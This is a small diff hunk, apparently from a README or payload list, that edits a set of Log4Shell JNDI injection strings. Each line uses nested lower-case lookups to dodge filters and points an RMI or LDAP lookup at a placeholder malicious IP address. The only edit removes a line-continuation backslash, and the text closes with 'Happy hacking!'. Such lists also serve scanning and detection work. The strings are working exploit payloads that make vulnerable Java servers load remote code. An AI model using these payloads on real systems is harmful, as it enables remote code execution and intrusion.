@@ -15,6 +15,6 @@ ${${lower:jndi}:${lower:rmi}://[malicious ip address]/poc} \
 ${jndi:rmi://[malicious ip address]} \
 ${${lower:${lower:jndi}}:${lower:rmi}://[malicious ip address]} \
 ${jndi:${lower:l}${lower:d}ap://[malicious ip address]/a} \
-${jndi:${lower:l}${lower:d}ap://[malicious ip address]/} \
+${jndi:${lower:l}${lower:d}ap://[malicious ip address]/} 
 
 Happy hacking!
